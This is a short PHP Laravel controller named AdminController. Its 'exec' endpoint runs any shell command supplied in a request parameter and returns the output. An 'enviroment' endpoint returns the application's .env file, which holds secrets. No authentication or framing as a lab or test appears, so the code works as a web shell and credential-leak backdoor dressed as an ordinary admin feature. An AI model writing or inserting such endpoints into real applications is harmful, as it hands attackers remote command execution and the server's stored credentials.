<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\App;

class AdminController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //
    }

    // add in exec endpoint
    // executes code
    function exec(Request $request)
    {
        if($request->input('code') == null)
        {
            return response()->json([
                'error' => "you need to include the code parameter!"
            ]);
        }
        return response()->json([
            'result' => exec($request->input('code'))
        ]);
    }

    function enviroment() {
        return file_get_contents('../.env');
    }

    //
}
